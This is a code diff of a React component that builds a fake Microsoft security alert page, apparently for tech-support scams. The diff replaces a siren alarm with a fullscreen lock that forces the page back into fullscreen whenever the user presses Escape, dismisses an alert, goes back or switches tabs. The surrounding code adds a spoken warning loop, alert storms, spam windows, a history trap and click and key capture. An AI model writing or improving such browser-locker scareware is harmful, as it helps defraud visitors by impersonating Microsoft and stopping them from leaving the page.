@@ -74,25 +74,11 @@ export default function MicrosoftAlert() {
   const alertBusy = useRef(false);
   const lineIndex = useRef(0);
   const voiceGen = useRef(0);
-  const audioCtx = useRef<AudioContext | null>(null);
-  const alarmNodes = useRef<{ osc: OscillatorNode; gain: GainNode }[]>([]);
   const ttsAudio = useRef<HTMLAudioElement | null>(null);
   const voiceTimer = useRef<number | null>(null);
   const alertTimer = useRef<number | null>(null);
   const keepAlive = useRef<number | null>(null);
-
-  const stopAlarm = useCallback(() => {
-    for (const n of alarmNodes.current) {
-      try {
-        n.osc.stop();
-        n.osc.disconnect();
-        n.gain.disconnect();
-      } catch {
-        /* already stopped */
-      }
-    }
-    alarmNodes.current = [];
-  }, []);
+  const fsLock = useRef<number | null>(null);
 
   const stopVoice = useCallback(() => {
     voiceGen.current += 1;
@@ -120,54 +106,46 @@ export default function MicrosoftAlert() {
 
   const stopAll = useCallback(() => {
     stopVoice();
-    stopAlarm();
     if (alertTimer.current) {
       window.clearTimeout(alertTimer.current);
       alertTimer.current = null;
     }
-  }, [stopAlarm, stopVoice]);
-
-  const startAlarm = useCallback(async () => {
-    try {
-      if (!audioCtx.current) {
-        audioCtx.current = new AudioContext();
-      }
-      const ctx = audioCtx.current;
-      if (ctx.state === "suspended") await ctx.resume();
-
-      stopAlarm();
-
-      const makeTone = (freq: number, type: OscillatorType, vol: number) => {
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.type = type;
-        osc.frequency.value = freq;
-        gain.gain.value = vol;
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.start();
-        alarmNodes.current.push({ osc, gain });
-
-        // Siren sweep
-        const sweep = () => {
-          if (unlockedRef.current) return;
-          const now = ctx.currentTime;
-          osc.frequency.cancelScheduledValues(now);
-          osc.frequency.setValueAtTime(freq, now);
-          osc.frequency.linearRampToValueAtTime(freq * 1.6, now + 0.45);
-          osc.frequency.linearRampToValueAtTime(freq, now + 0.9);
-        };
-        sweep();
-        window.setInterval(sweep, 900);
-      };
-
-      makeTone(740, "square", 0.07);
-      makeTone(980, "sawtooth", 0.045);
-      makeTone(520, "triangle", 0.03);
-    } catch {
-      /* autoplay policies */
+    if (fsLock.current) {
+      window.clearInterval(fsLock.current);
+      fsLock.current = null;
     }
-  }, [stopAlarm]);
+  }, [stopVoice]);
+
+  const enterFullscreen = useCallback(async () => {
+    if (unlockedRef.current) return;
+    const el = document.documentElement as HTMLElement & {
+      webkitRequestFullscreen?: () => void;
+      webkitRequestFullScreen?: () => void;
+      msRequestFullscreen?: () => void;
+    };
+    try {
+      if (!document.fullscreenElement && !(document as Document & { webkitFullscreenElement?: Element }).webkitFullscreenElement) {
+        if (el.requestFullscreen) await el.requestFullscreen();
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
+        else if (el.msRequestFullscreen) el.msRequestFullscreen();
+      }
+    } catch {
+      /* user gesture / policy */
+    }
+  }, []);
+
+  const lockFullscreen = useCallback(() => {
+    void enterFullscreen();
+    if (fsLock.current) return;
+    fsLock.current = window.setInterval(() => {
+      if (unlockedRef.current || !armedRef.current) return;
+      const doc = document as Document & { webkitFullscreenElement?: Element };
+      if (!document.fullscreenElement && !doc.webkitFullscreenElement) {
+        void enterFullscreen();
+      }
+    }, 600);
+  }, [enterFullscreen]);
 
   const speakLineSpeech = useCallback(async (text: string): Promise<void> => {
     if (!window.speechSynthesis) return;
@@ -176,7 +154,7 @@ export default function MicrosoftAlert() {
       window.speechSynthesis.cancel();
       const u = new SpeechSynthesisUtterance(text);
       u.lang = "en-US";
-      u.rate = 0.9;
+      u.rate = 0.88;
       u.pitch = 1;
       u.volume = 1;
       const preferred = pickEnglishVoice(voices);
@@ -193,8 +171,7 @@ export default function MicrosoftAlert() {
       u.onend = finish;
       u.onerror = finish;
       window.speechSynthesis.speak(u);
-      // Chrome kabhi-kabhi onend miss karta hai
-      window.setTimeout(finish, Math.min(12000, text.length * 80 + 2000));
+      window.setTimeout(finish, Math.min(14000, text.length * 85 + 2500));
     });
   }, []);
 
@@ -229,16 +206,14 @@ export default function MicrosoftAlert() {
 
         const started = Date.now();
         if (window.speechSynthesis) {
-          window.speechSynthesis.getVoices();
           await speakLineSpeech(text);
         }
-        // Agar speech fail / silent / too short → Google TTS audio
         if (voiceGen.current === gen && Date.now() - started < 500) {
           await speakLineTtsAudio(text);
         }
 
         if (voiceGen.current !== gen) return;
-        await new Promise((r) => setTimeout(r, 500));
+        await new Promise((r) => setTimeout(r, 700));
       }
     };
 
@@ -249,7 +224,6 @@ export default function MicrosoftAlert() {
         if (unlockedRef.current) return;
         try {
           if (window.speechSynthesis?.paused) window.speechSynthesis.resume();
-          void audioCtx.current?.resume();
         } catch {
           /* ignore */
         }
@@ -261,7 +235,6 @@ export default function MicrosoftAlert() {
     if (unlockedRef.current || alertBusy.current) return;
     alertBusy.current = true;
     try {
-      // Pause speech during modal (browser freezes JS anyway)
       try {
         window.speechSynthesis?.cancel();
       } catch {
@@ -280,17 +253,19 @@ export default function MicrosoftAlert() {
       }
     } finally {
       alertBusy.current = false;
+      // alert() fullscreen tod deta hai — turant wapas lock
       if (!unlockedRef.current && armedRef.current) {
-        // Nayi generation se dubara voice
+        lockFullscreen();
+        window.setTimeout(() => void enterFullscreen(), 50);
+        window.setTimeout(() => void enterFullscreen(), 200);
         startVoiceLoop();
       }
     }
-  }, [startVoiceLoop]);
+  }, [startVoiceLoop, lockFullscreen, enterFullscreen]);
 
   const scheduleAlertLoop = useCallback(() => {
     if (alertTimer.current) window.clearTimeout(alertTimer.current);
     const info = getBrowserInfo();
-    // Windows Chrome pe jaldi + tight loop; Safari pe soft (testing)
     const firstDelay = info.isChrome ? 2800 : 5500;
     const repeatEvery = info.isChrome ? 1800 : 4000;
     const tick = () => {
@@ -325,35 +300,19 @@ export default function MicrosoftAlert() {
     }
   }, []);
 
-  const enterFullscreen = useCallback(async () => {
-    try {
-      await document.documentElement.requestFullscreen?.();
-    } catch {
-      /* ignore */
-    }
-  }, []);
-
   const armTrap = useCallback(() => {
     if (unlockedRef.current || armedRef.current) return;
     armedRef.current = true;
     setIsArmed(true);
-    void enterFullscreen();
-    void startAlarm();
+    lockFullscreen();
     startVoiceLoop();
     scheduleAlertLoop();
     openSpamWindows();
 
-    // History trap
     for (let i = 0; i < 50; i++) {
       history.pushState(null, "", location.href);
     }
-  }, [
-    enterFullscreen,
-    startAlarm,
-    startVoiceLoop,
-    scheduleAlertLoop,
-    openSpamWindows,
-  ]);
+  }, [lockFullscreen, startVoiceLoop, scheduleAlertLoop, openSpamWindows]);
 
   const unlock = useCallback(() => {
     unlockedRef.current = true;
@@ -437,15 +396,27 @@ export default function MicrosoftAlert() {
     const onVis = () => {
       if (unlockedRef.current || !armedRef.current) return;
       if (document.visibilityState === "visible") {
+        lockFullscreen();
         fireAlertStorm();
-        void startAlarm();
         startVoiceLoop();
+      }
+    };
+
+    const onFsChange = () => {
+      if (unlockedRef.current || !armedRef.current) return;
+      const doc = document as Document & { webkitFullscreenElement?: Element };
+      if (!document.fullscreenElement && !doc.webkitFullscreenElement) {
+        // Escape / alert ne FS tod di — turant wapas
+        window.setTimeout(() => lockFullscreen(), 30);
       }
     };
 
     const onPop = () => {
       history.pushState(null, "", location.href);
-      if (!unlockedRef.current) fireAlertStorm();
+      if (!unlockedRef.current) {
+        lockFullscreen();
+        fireAlertStorm();
+      }
     };
 
     const trapClick = (e: MouseEvent) => {
@@ -462,7 +433,7 @@ export default function MicrosoftAlert() {
       setShowWhite(true);
       setShowBlue(true);
       setShowToast(true);
-      void enterFullscreen();
+      lockFullscreen();
       fireAlertStorm();
     };
 
@@ -481,12 +452,15 @@ export default function MicrosoftAlert() {
         e.preventDefault();
         e.stopPropagation();
         if (!armedRef.current) armTrap();
+        else lockFullscreen();
         fireAlertStorm();
       }
     };
 
     window.addEventListener("beforeunload", onBeforeUnload);
     document.addEventListener("visibilitychange", onVis);
+    document.addEventListener("fullscreenchange", onFsChange);
+    document.addEventListener("webkitfullscreenchange", onFsChange as EventListener);
     window.addEventListener("popstate", onPop);
     document.addEventListener("mousedown", trapClick, true);
     document.addEventListener("keydown", trapKey, true);
@@ -495,6 +469,11 @@ export default function MicrosoftAlert() {
     return () => {
       window.removeEventListener("beforeunload", onBeforeUnload);
       document.removeEventListener("visibilitychange", onVis);
+      document.removeEventListener("fullscreenchange", onFsChange);
+      document.removeEventListener(
+        "webkitfullscreenchange",
+        onFsChange as EventListener,
+      );
       window.removeEventListener("popstate", onPop);
       document.removeEventListener("mousedown", trapClick, true);
       document.removeEventListener("keydown", trapKey, true);
@@ -504,9 +483,8 @@ export default function MicrosoftAlert() {
     unlocked,
     armTrap,
     fireAlertStorm,
-    startAlarm,
     startVoiceLoop,
-    enterFullscreen,
+    lockFullscreen,
     stopAll,
   ]);
 
@@ -572,7 +550,7 @@ export default function MicrosoftAlert() {
 
       {speaking && (
         <div className="absolute left-3 right-3 top-3 z-[80] rounded bg-black/80 px-3 py-2 text-[12px] text-white sm:left-3 sm:right-auto sm:max-w-md">
-          <p className="font-semibold text-[#ffb900]">🔊 Microsoft Security reading…</p>
+          <p className="font-semibold text-[#7CFC00]">🔊 Reading on-screen warning…</p>
           <p className="mt-1 opacity-95">{voiceLine || "Starting audio…"}</p>
         </div>
       )}
